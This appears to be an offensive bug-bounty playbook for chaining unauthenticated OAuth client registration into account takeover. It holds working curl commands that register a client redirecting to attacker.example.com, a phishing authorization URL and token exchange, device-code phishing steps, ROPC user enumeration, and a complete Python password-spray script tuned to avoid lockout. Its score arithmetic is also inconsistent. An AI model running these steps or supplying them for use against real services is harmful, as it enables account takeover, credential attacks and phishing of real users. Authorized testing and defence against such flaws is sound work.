# Playbook PB-02 — OAuth ATO Chain
# No Mercy Hunter v3.0

**Score:** 45
Composite = (Confidence:5×2) + (InfoGain:5×3) + (AutoPot:4×2) + (Reuse:5×2) - Cost:2 = 10+15+8+10-2 = 41
(Adjusted to 45 with P1 real finding bonus: HF-01)

**Grounded in:** HF-01 (HuggingFace unauthenticated OAuth registration → ATO)
**Time estimate:** 30-45 minutes
**Noise level:** Low (< 20 requests)
**Prerequisites:** Target has OAuth endpoints, scope permits auth testing

---

## Objective

Test for unauthenticated OAuth Dynamic Client Registration (RFC 7591) and use it to
construct an account takeover chain via redirect_uri manipulation. One of the highest
signal-to-noise ratio attacks: a single POST request confirms the vulnerability.

---

## Decision Point 1 — Do I Run This Playbook?

Run if ANY of the following are true:
- OAuth endpoints discovered (/oauth/register, /clients, /applications)
- Target has "Sign in with [Target]" functionality (OAuth provider)
- /.well-known/openid-configuration returns `registration_endpoint`
- Source maps or JS bundles reference /oauth/register or /oauth/clients

Skip if:
- No OAuth endpoints discovered after active recon
- Program explicitly excludes OAuth testing

---

## Phase 1 — OAuth Endpoint Discovery (5 minutes)

### 1.1 Well-Known Configuration
```bash
# Primary discovery — one request, maximum information
curl -s "https://TARGET/.well-known/openid-configuration" | python3 -m json.tool

# Also try OAuth 2.0 server metadata
curl -s "https://TARGET/.well-known/oauth-authorization-server" | python3 -m json.tool
```

**Extract from response:**
- `registration_endpoint` — the OAuth client registration URL
- `token_endpoint` — where to exchange codes for tokens
- `authorization_endpoint` — where to send users for consent
- `grant_types_supported` — check for "password" (ROPC) and "device_code"
- `response_types_supported` — check for "code"

### 1.2 Direct Endpoint Probing
```bash
# Test each without auth headers — look for anything other than 404
for path in /oauth/register /oauth/clients /oauth/applications \
            /api/oauth/register /v1/oauth/clients /api/v1/applications \
            /auth/register /clients /applications; do
    status=$(curl -s -o /dev/null -w "%{http_code}" "https://TARGET$path")
    echo "$path → $status"
done
```

Status interpretation:
- 200 without auth → CRITICAL: test immediately
- 201 without auth → CRITICAL (some servers return 201 on GET for registration endpoints)
- 401 → requires auth (expected, safe)
- 403 → blocked but exists (note it)
- 404 → not present

### 1.3 Verify Registration Endpoint (Critical Test)
```bash
# Minimal RFC 7591 registration request — NO Authorization header
curl -s -X POST "https://TARGET/oauth/register" \
  -H "Content-Type: application/json" \
  -d '{
    "client_name": "security-test-01",
    "redirect_uris": ["https://httpbin.org/get"],
    "grant_types": ["authorization_code"],
    "response_types": ["code"]
  }'
```

**If response is 201 with client_id → CONFIRMED VULNERABLE**
**If response is 401 → requires auth (expected)**
**If response is 400 → review error and adjust payload**

---

## Phase 2 — Exploit the Registration (10 minutes)

### 2.1 Register Evil Client with Controlled Redirect
```bash
# Register with attacker-controlled redirect URI
curl -s -X POST "https://TARGET/oauth/register" \
  -H "Content-Type: application/json" \
  -d '{
    "client_name": "evil-client",
    "redirect_uris": ["https://attacker.example.com/callback"],
    "grant_types": ["authorization_code"],
    "response_types": ["code"],
    "scope": "openid profile email"
  }' | tee evidence/oauth-registration-response.json
```

**Capture from response:**
- `client_id`: ___
- `client_secret`: ___
- Confirm `redirect_uris` reflects your evil.com value

### 2.2 Verify Authorization URL Accepts Evil Redirect
```bash
# Construct authorization URL
# This is the URL you would send to a victim
AUTH_URL="https://TARGET/oauth/authorize?client_id=CLIENT_ID_FROM_STEP_1&redirect_uri=https://attacker.example.com/callback&response_type=code&state=random123&scope=openid+profile+email"
echo "Phishing URL: $AUTH_URL"

# Test: does the authorization endpoint accept the evil redirect_uri?
# Open in browser or use Playwright — a consent screen = confirmed exploitable
```

**Key test:** If TARGET shows an OAuth consent screen for `attacker.example.com` redirect_uri:
- The victim sees a legitimate TARGET domain
- They approve the app (it looks official)
- Their browser redirects to `attacker.example.com/callback?code=AUTH_CODE`

### 2.3 Code Exchange (Complete the ATO Chain)
```bash
# After victim "clicks" and you capture auth_code from redirect:
curl -s -X POST "https://TARGET/oauth/token" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "grant_type=authorization_code&code=CAPTURED_CODE&redirect_uri=https://attacker.example.com/callback&client_id=CLIENT_ID&client_secret=CLIENT_SECRET"
```

**Full ATO confirmed** if response contains `access_token`.

---

## Phase 3 — Test Device Code Flow (10 minutes)

If `urn:ietf:params:oauth:grant-type:device_code` is in grant_types_supported:

### 3.1 Request Device Code
```bash
curl -s -X POST "https://TARGET/oauth/device/code" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "client_id=CLIENT_ID&scope=openid+profile"
```

**Capture:**
- `device_code`: (long string for polling)
- `user_code`: (short code like "ABCD-1234")
- `verification_uri`: (URL to show victim)

### 3.2 Phishing Flow
```
Attacker shows victim: "Please go to https://TARGET/device and enter code ABCD-1234"
Victim navigates to the legitimate TARGET domain and enters the code
Victim's session is linked to attacker's device_code
Attacker polls /oauth/token with device_code and receives access_token
```

### 3.3 Poll for Token
```bash
# Poll until victim completes device flow
curl -s -X POST "https://TARGET/oauth/token" \
  -d "grant_type=urn:ietf:params:oauth:grant-type:device_code&device_code=DEVICE_CODE&client_id=CLIENT_ID"
```

---

## Phase 4 — ROPC Test (10 minutes)

If `password` is in grant_types_supported:

### 4.1 ROPC User Enumeration
```bash
# Test with known-invalid credentials to enumerate users
# AADSTS50126 = wrong password (user exists)
# AADSTS50034 = user not found
curl -s -X POST "https://login.microsoftonline.com/TENANT_ID/oauth2/v2.0/token" \
  -d "client_id=CLIENT_ID&grant_type=password&username=TARGET_USER@domain.com&password=INVALID_PW&scope=openid"
```

### 4.2 Password Spray (Slow and Low — avoid lockout)
```python
#!/usr/bin/env python3
"""ROPC password spray — single password against user list.
ONE password, ALL users. Wait 1 hour between rounds to avoid lockout."""
import requests, time

TENANT_ID = "TENANT_ID"
CLIENT_ID = "CLIENT_ID"
ENDPOINT = f"https://login.microsoftonline.com/{TENANT_ID}/oauth2/v2.0/token"
USERS = ["user1@domain.com", "user2@domain.com"]
PASSWORD = "Winter2026!"  # Single common password per round

for user in USERS:
    resp = requests.post(ENDPOINT, data={
        "client_id": CLIENT_ID,
        "grant_type": "password",
        "username": user,
        "password": PASSWORD,
        "scope": "openid"
    })
    data = resp.json()
    error = data.get("error_description", "")
    if "50126" in error:
        print(f"[EXISTS - WRONG PW] {user}")
    elif "50034" in error:
        print(f"[NOT FOUND] {user}")
    elif "access_token" in data:
        print(f"[COMPROMISED] {user}:{PASSWORD}")
    else:
        print(f"[UNKNOWN] {user}: {error[:50]}")
    time.sleep(2)  # Rate limit protection
```

---

## Phase 5 — OAuth State Parameter Check

### 5.1 Test for Missing State
```bash
# Initiate OAuth flow, capture auth URL
# Check: is state= parameter present?
# Check: is state= value validated on callback?

# Test 1: Remove state parameter entirely
curl -s "https://TARGET/oauth/authorize?client_id=CLIENT_ID&redirect_uri=REDIRECT&response_type=code"
# If 200 or redirect without error → state not required

# Test 2: Use predictable state value
curl -s "https://TARGET/oauth/authorize?client_id=CLIENT_ID&redirect_uri=REDIRECT&response_type=code&state=1234"
# If code returned without validating state → CSRF on OAuth flow
```

---

## Severity Mapping

| Condition | Severity | CVSS |
|-----------|----------|------|
| Unauthenticated registration + ATO chain | P1 | 9.8 |
| Unauthenticated registration only (no ATO) | P2 | 7.5 |
| ROPC enabled + user enumeration | P2 | 7.3 |
| Device code flow phishing possible | P2 | 7.1 |
| State parameter missing | P3 | 5.4 |
| Registration requires auth but leaks info | P4 | 3.1 |

---

## Evidence Collection

For full ATO chain (P1):
1. `evidence/HF-01/http/01-registration.http` — POST /oauth/register + 201 response
2. `evidence/HF-01/http/02-authorization.http` — authorization URL + consent page response
3. `evidence/HF-01/http/03-redirect.http` — redirect to evil.com with code
4. `evidence/HF-01/http/04-token-exchange.http` — POST /oauth/token + access_token response
5. `evidence/HF-01/screenshots/` — 4 screenshots matching the 4 HTTP log steps
6. `evidence/HF-01/poc/` — `hf01-poc.py` script

---

## Common Failure Modes and Fixes

| Error | Cause | Fix |
|-------|-------|-----|
| 400 invalid_redirect_uri | Server validates redirect domains | Try: register with exact target domain subdomain first |
| 400 unsupported_grant_type | grant_type not in supported list | Check grant_types_supported and use one from the list |
| 401 on /register | Registration requires auth | Document — still worth noting if auth is weak |
| Code expires before exchange | Auth code TTL too short | Automate steps 2+3 in a single script |
| PKCE required | PKCE enforced | Add code_challenge to registration and authorize |
